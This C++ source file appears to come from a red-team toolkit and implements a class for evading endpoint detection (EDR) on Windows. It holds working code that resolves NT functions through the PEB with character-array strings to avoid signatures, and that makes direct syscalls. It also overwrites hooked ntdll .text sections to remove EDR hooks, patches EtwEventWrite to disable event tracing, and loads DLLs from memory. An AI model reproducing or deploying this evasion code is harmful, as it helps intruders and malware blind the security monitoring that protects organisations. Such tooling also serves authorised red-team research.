/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "bypass_av.h"

Bypass_EDR::Bypass_EDR()
{

}

Bypass_EDR::~Bypass_EDR()
{

}

/*
* Functions to access DLL files
*/

HANDLE Bypass_EDR::CreateFileW(LPWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes)
{
	HANDLE h;
	OBJECT_ATTRIBUTES obj = { 0 };
	IO_STATUS_BLOCK isb = { 0 };

	DUNICODE_STRING unicodeString;

	LPWSTR lpFullFileName = (LPWSTR)malloc((10 + wcslen(lpFileName)) * sizeof(wchar_t));
	if (lpFileName[0] != L'\\')
	{
		swprintf_s(lpFullFileName, 10 + wcslen(lpFileName), L"\\??\\\\%s", lpFileName);
	}
	else
	{
		swprintf_s(lpFullFileName, 10 + wcslen(lpFileName), L"%s", lpFileName);
	}

	RtlInitUnicodeString(&unicodeString, lpFullFileName);
	InitializeObjectAttributes(&obj, &unicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntcreatefile_str[] = { 'N','t','C','r','e','a','t','e','F','i','l','e', 0};
	//_NtCreateFile fNtCreateFile = (_NtCreateFile)GetProcAddress(hNtDll, ntcreatefile_str);
	_NtCreateFile fNtCreateFile = (_NtCreateFile)this->GetAPIFromPEBModule(hNtDll, ntcreatefile_str);

	NTSTATUS status = fNtCreateFile(&h, dwDesiredAccess, &obj, &isb, 0,
		dwFlagsAndAttributes, dwShareMode, dwCreationDisposition,
		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtCreateFile(&h, dwDesiredAccess, &obj, &isb, 0,
		dwFlagsAndAttributes, dwShareMode, dwCreationDisposition,
		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
#endif

	free(lpFullFileName);

	if (status != 0)
	{
		printf("Error: %x\n", status);
		return NULL;
	}

	return h;
}

NTSTATUS Bypass_EDR::ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead)
{
	IO_STATUS_BLOCK io;
	memset(&io, 0, sizeof(IO_STATUS_BLOCK));

#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntreadfile_str[] = { 'N','t','R','e','a','d','F','i','l','e', 0 };
	//_NtReadFile fNtReadFile = (_NtReadFile)GetProcAddress(hNtDll, ntreadfile_str);
	_NtReadFile fNtReadFile = (_NtReadFile)this->GetAPIFromPEBModule(hNtDll, ntreadfile_str);

	NTSTATUS status = fNtReadFile(hFile, NULL, NULL, NULL, &io, lpBuffer, nNumberOfBytesToRead, NULL, NULL);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtReadFile(hFile, NULL, NULL, NULL, &io, lpBuffer, nNumberOfBytesToRead, NULL, NULL);
#endif

	*lpNumberOfBytesRead = io.Information;

	return status;
}

BOOL Bypass_EDR::CloseHandle(HANDLE hObject)
{
#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntclose_str[] = { 'N','t','C','l','o','s','e', 0 };
	//_NtClose fNtClose = (_NtClose)GetProcAddress(hNtDll, ntclose_str);
	_NtClose fNtClose = (_NtClose)this->GetAPIFromPEBModule(hNtDll, ntclose_str);

	NTSTATUS status = fNtClose(hObject);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtClose(hObject);
#endif

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL Bypass_EDR::VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)
{
	HANDLE process = (HANDLE)-1;
	SIZE_T protect_size = dwSize;

#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntprotectvirtualmemory_str[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0};
	//_NtProtectVirtualMemory fNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtDll, ntprotectvirtualmemory_str);
	_NtProtectVirtualMemory fNtProtectVirtualMemory = (_NtProtectVirtualMemory)this->GetAPIFromPEBModule(hNtDll, ntprotectvirtualmemory_str);

	NTSTATUS status = fNtProtectVirtualMemory(process, &lpAddress, &protect_size, flNewProtect, lpflOldProtect);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtProtectVirtualMemory(process, &lpAddress, &protect_size, flNewProtect, lpflOldProtect);
#endif

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

void* Bypass_EDR::GetModuleFromPEB(const wchar_t* wModuleName)
{
#if defined(_WIN64)
#define PEBOffset 0x60
#define LdrOffset 0x18
#define ListOffset 0x10
	unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined(_WIN32)
#define PEBOffset 0x30
#define LdrOffset 0x0C
#define ListOffset 0x0C
	unsigned long long pPeb = __readfsdword(PEBOffset); 
#endif
	pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
	PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);
	while (pModuleList->DllBase)
	{
		if (!wcscmp(pModuleList->BaseDllName.Buffer, wModuleName))
			return pModuleList->DllBase;
		pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
	}
	
	return nullptr;
}

uintptr_t Bypass_EDR::GetAPIFromPEBModule(void* hModule, const char* wAPIName)
{
#if defined(_WIN32)
	unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
	IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);
	if (idhDosHeader->e_magic == 0x5A4D)
	{
#if defined(_M_IX86)
		IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined(_M_AMD64)
		IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif
		if (inhNtHeader->Signature == 0x4550)
		{
			IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			for (register unsigned int uilter = 0; uilter < iedExportDirectory->NumberOfNames; uilter++)
			{
				char* szNames = reinterpret_cast<char*>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uilter]);
				//printf("Function: %s\n", szNames);
				if (!strcmp(szNames, wAPIName))
				{
					unsigned short usOrdinal = reinterpret_cast<unsigned short*>(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uilter];
					return reinterpret_cast<uintptr_t>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
				}
			}
		}
	}

	return 0;
#endif
}


#include <iostream>
void print_buffer(char* address, unsigned int size)
{
	for (int i = 0; i < size; ++i)
		std::cout << std::hex << std::setfill('0') << std::setw(2) << (int)address[i] << " ";
	std::cout << std::endl;
}

int Bypass_EDR::check_dll(const char* dll_name, const char* ntdll_data)
{
	int compare = -1;
	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(dll_name);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			int res = memcmp((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdll_data + (DWORD_PTR)hookedSectionHeader->PointerToRawData), hookedSectionHeader->Misc.VirtualSize);
			if (res == 0)
			{
				compare = 0;
			}
			else
			{
				compare = 1;
			}
		}
	}

	//CloseHandle(process);
	FreeLibrary(ntdllModule);

	return compare;
}

BOOL Bypass_EDR::unhook_dll(const char* dll_name, const char* ntdll_data)
{
	//HANDLE process = GetCurrentProcess();
	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(dll_name);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = this->VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdll_data + (DWORD_PTR)hookedSectionHeader->PointerToRawData), hookedSectionHeader->Misc.VirtualSize);
			isProtected = this->VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	//CloseHandle(process);
	FreeLibrary(ntdllModule);

	return TRUE;
}

BOOL Bypass_EDR::disable_etw()
{
	// Get the EventWrite function
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char etweventwrite_str[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
	//void* eventWrite = GetProcAddress(hNtDll, etweventwrite_str);
	void* eventWrite = (void*)this->GetAPIFromPEBModule(hNtDll, etweventwrite_str);

	DWORD oldProt;
	// Allow writing to page
	this->VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);

#if defined(_M_IX86)
	// Patch with "ret 14" on x86
	memcpy(eventWrite, "\xc2\x14\x00\x00", 4);
#elif defined(_M_AMD64)
	// source : https://github.com/ScriptIdiot/BOF-patchit/blob/main/patchit.c
	memcpy(eventWrite, "\xc3", 1);
#endif

	DWORD oldOldProt;
	// Return memory to original protection
	this->VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);

	return TRUE;
}

bool Bypass_EDR::load_dll(const char* dll_name, const char* dll_data, size_t dll_size)
{
	std::string module_name = std::string(dll_name);

	if (this->module_map.find(module_name) != this->module_map.end())
	{
		// Already exists, just return true without loading the new one
		return true;
	}

	HMEMORYMODULE module = MemoryLoadLibrary(dll_data, dll_size);

	if (module == NULL)
	{
		return false;
	}

	this->module_map[module_name] = module;

	return true;

}

bool Bypass_EDR::dll_exists(const char* dll_name)
{
	std::string module_name = std::string(dll_name);

	if (this->module_map.find(module_name) != this->module_map.end())
	{
		return true;
	}
	else
	{
		return false;
	}
}

void* Bypass_EDR::get_func(const char* dll_name, const char* func_name)
{
	std::string module_name = std::string(dll_name);

	auto module = this->module_map.find(module_name);

	if (module == this->module_map.end())
	{
		return NULL;
	}

	void* result = MemoryGetProcAddress(module->second, func_name);

	return result;
}

DLL::DLL(char* name, BYTE* address)
{
	this->name = std::string(name);
	this->address = address;
}

/*
* Source: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/hook_finder64.c
*/
std::list<DLL> Bypass_EDR::list_loaded_dlls()
{
	std::list<DLL> dll_list;

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
	MODULEENTRY32 me32;
	me32.dwSize = sizeof(MODULEENTRY32);

	if (Module32First(hSnap, &me32)) {
		do {
			dll_list.push_back(DLL(me32.szExePath, me32.modBaseAddr));

		} while (Module32Next(hSnap, &me32));
	}

	CloseHandle(hSnap);

	return dll_list;
}

/*
* Source: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/hook_finder64.c
*/
std::list<std::string> Bypass_EDR::check_hook_jmp(HMODULE hDll)
{
	
	std::list<std::string> hook_list;
	
	IMAGE_DOS_HEADER* MZ = (IMAGE_DOS_HEADER*)hDll;
	IMAGE_NT_HEADERS* PE = (IMAGE_NT_HEADERS*)((BYTE*)hDll + MZ->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hDll + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* name = (DWORD*)((BYTE*)hDll + export_dir->AddressOfNames);

	DWORD i = 0;
	for (i; i < export_dir->NumberOfNames; i++)
	{
		int* opcode = (int*)GetProcAddress(hDll, (LPCSTR)((CHAR*)hDll + name[i]));

		// not all EDRs hook the first byte you will miss some hook
		if (*opcode == 0xe9) {
			hook_list.push_back(std::string((CHAR*)hDll + name[i]));
		}
	}

	return hook_list;
}

void PrintHexDump(DWORD length, PBYTE buffer)
{
	DWORD i, count, index;
	CHAR rgbDigits[] = "0123456789abcdef";
	CHAR rgbLine[100];
	char cbLine;

	for (index = 0; length; length -= count, buffer += count, index += count)
	{
		count = (length > 16) ? 16 : length;

		sprintf_s(rgbLine, 100, "%4.4x  ", index);
		cbLine = 6;

		for (i = 0; i < count; i++)
		{
			rgbLine[cbLine++] = rgbDigits[buffer[i] >> 4];
			rgbLine[cbLine++] = rgbDigits[buffer[i] & 0x0f];
			if (i == 7)
			{
				rgbLine[cbLine++] = ':';
			}
			else
			{
				rgbLine[cbLine++] = ' ';
			}
		}
		for (; i < 16; i++)
		{
			rgbLine[cbLine++] = ' ';
			rgbLine[cbLine++] = ' ';
			rgbLine[cbLine++] = ' ';
		}

		rgbLine[cbLine++] = ' ';

		for (i = 0; i < count; i++)
		{
			if (buffer[i] < 32 || buffer[i] > 126)
			{
				rgbLine[cbLine++] = '.';
			}
			else
			{
				rgbLine[cbLine++] = buffer[i];
			}
		}

		rgbLine[cbLine++] = 0;
		printf("%s\n", rgbLine);
	}
}

std::list<std::string>* Bypass_EDR::check_hook_diff(const wchar_t* dll_path)
{
	std::list<std::string>* hook_list = NULL;
	PBYTE dll_text = NULL;
	PBYTE memory_text = NULL;
	unsigned int text_size = 0;

	// Download from disk the dll

	HANDLE handle = this->CreateFileW((LPWSTR)dll_path, FILE_GENERIC_READ, FILE_SHARE_READ, FILE_OPEN, NULL);

	if (handle == NULL)
	{
		return NULL;
	}

	unsigned int dll_size = 0;
	unsigned int dll_buffer_size = 1024 * 10;
	char* dll_buffer = (char*)malloc(dll_buffer_size);

	DWORD size_read;
	while (true)
	{
		NTSTATUS hres = this->ReadFile(handle, dll_buffer + dll_size, dll_buffer_size - dll_size, &size_read);

		if (hres == 0xC0000011) // STATUS_END_OF_FILE
		{
			dll_size += size_read;
			break;
		}
		else if (hres == 0) // STATUS_SUCCESS
		{
			dll_size += size_read;

			if (dll_size == dll_buffer_size)
			{
				// REALLOC
				dll_buffer_size += 1024 * 10;
				dll_buffer = (char*)realloc(dll_buffer, dll_buffer_size);
			}
		}
		else
		{
			return NULL;
		}
	}

	BOOL res = this->CloseHandle(handle);
	if (res == FALSE)
	{
		return NULL;
	}

	// Get the dll loaded, extract both 

	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleW(dll_path);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID dllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)dllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {

			dll_text = (PBYTE)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
			memory_text = (PBYTE)((DWORD_PTR)dll_buffer + (DWORD_PTR)hookedSectionHeader->PointerToRawData);
			text_size = (unsigned int)hookedSectionHeader->Misc.VirtualSize;

			printf("DLL start address: %x\n", dll_text);
			printf("MEM start address: %x\n", memory_text);
			printf("SIZE             : %x\n", text_size);

			int compare = memcmp(dll_text, memory_text, text_size);
			if (compare == 0)
			{
				printf("DLL has not been modified\n");
			}
			else if (compare == 1)
			{
				printf("DLL has been modified\n");
			}
			else
			{
				printf("Unable to compare\n");
			}

		}
	}

	if (dll_text == NULL || memory_text == NULL)
	{
		return NULL;
	}

	hook_list = new std::list<std::string>();

	// Get function address in loaded dll

	IMAGE_DOS_HEADER* MZ = (IMAGE_DOS_HEADER*)ntdllModule;
	IMAGE_NT_HEADERS* PE = (IMAGE_NT_HEADERS*)((BYTE*)ntdllModule + MZ->e_lfanew);
	IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntdllModule + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* name = (DWORD*)((BYTE*)ntdllModule + export_dir->AddressOfNames);

	DWORD i = 0;
	printf("DLL start address: %x\n", dll_text);
	printf("MEM start address: %x\n", memory_text);
	printf("SIZE             : %x\n", text_size);
	printf("DLL end address  : %x\n", dll_text + text_size);
	for (i; i < export_dir->NumberOfNames; i++)
	{
		PBYTE start_address = (PBYTE)GetProcAddress(ntdllModule, (LPCSTR)((CHAR*)ntdllModule + name[i]));
		DWORD diff = (DWORD)(start_address - dll_text);

		// check if address is in the .text section
		if (diff >= 0 && diff < text_size)
		{
			// comparing function start bytes
			if (memcmp(start_address, memory_text + diff, 5) != 0) {
				hook_list->push_back(std::string((CHAR*)ntdllModule + name[i]));

				printf("%s DIFF:\n", (CHAR*)ntdllModule + name[i]);
				printf("Address: %x\n", start_address);
				printf("Expected:\n");
				PrintHexDump(5, (PBYTE)(memory_text + diff));
				printf("Got     :\n");
				PrintHexDump(5, (PBYTE)start_address);
				printf("text size: %x\n", text_size);
				printf("diff size: %x\n\n", diff);
			}
		}

	}

	//CloseHandle(process);
	FreeLibrary(ntdllModule);


	int compare = this->check_dll("ntdll.dll", dll_buffer);
	if (compare == 0)
	{
		printf("Ntdll has not been modified\n");
	}
	else if (compare == 1)
	{
		printf("Ntdll has been modified\n");
	}
	else
	{
		printf("Unable to compare\n");
	}

	return hook_list;
}
